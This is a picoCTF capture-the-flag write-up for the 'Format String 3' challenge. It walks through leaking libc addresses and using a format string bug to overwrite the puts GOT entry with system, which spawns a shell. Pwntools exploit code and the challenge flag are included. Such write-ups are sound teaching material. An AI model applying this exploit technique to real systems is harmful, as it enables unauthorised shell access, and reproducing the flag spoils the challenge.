# Writeup: Format String 3 
## Calculate Libc Base

To start off I take the address of setvbuf and then I calculate the libc base address by taking the address of setvbuf and subtracting it from its static offset in libc.sym. Then I set the lib c address and get the address of the system function from libc.sym. This is so that I can call the system function later when we find an opportunity to send the payload.

```
    p.recvuntil(b': ')
    setvbuf_addr = int(p.recvline().strip(), 16)
    setvbuf_offset = libc.sym['setvbuf']
    libc.address = setvbuf_addr - setvbuf_offset

    print("Setvbuf Address: " + hex(setvbuf_addr) + "\n")
    print("Libc Base Address: " + hex(libc.address) + "\n")
    system_addr = libc.sym['system']
    print("System Address: " + hex(system_addr) + "\n")
```
## Find /bin/sh Pointer

Since system needs a pointer to a string to work I looked throughout the code to find a string that would allow me to gain access to a shell. I ended up finding the string normal_string that contains the string "/bin/sh". Now that I have the string I need to figure out way to return to libc using the addresses I have obtained. While looking through the code I found this line:

```
puts(normal_string);

```
## Find Puts Address in GOT

Since when this line is executed the rdi register is set to the pointer to the string "/bin/sh" all I need to do is to figure out how to switch this function out with the system function. I figured out I could do this by overwriting the GOT due to the fact that this binary only has partial RELRO enabled, meaning that having full RELRO enabled protects binaries from having
their GOT overwritten. The GOT is a table full of library function names and addresses. With that in mind I wrote the following lines of code to help me change the address of the puts function to the address of the system function.

```
    elf = ELF('./format-string-3')
    puts_got = elf.got['puts']
    print(hex(puts_got))
```
## The Payload

Finally, now it's time to send the payload. In order to send the payload we need to take advantage of the format string vulnerability. This is a vulnerability that allows us to leak addresses from the stack and allows us to write to arbitray memory addresses by placing target addresses at any stack position n in our input buffer on the stack. In this case we are writing to the GOT, specifically to puts in the got table to replace the address of puts with the address of system. That way when the line "puts(normal_string);" is executed it will execute the system function and give us a shell. This is what I wrote to allow me to send the payload to the binary:

```
    payload = fmtstr_payload(38, {puts_got: system_addr}, write_size='short')
    p.sendline(payload)
    p.interactive()
```
## The Flag

And here is the flag!

`picoCTF{G07_G07?_cf6cb591}`
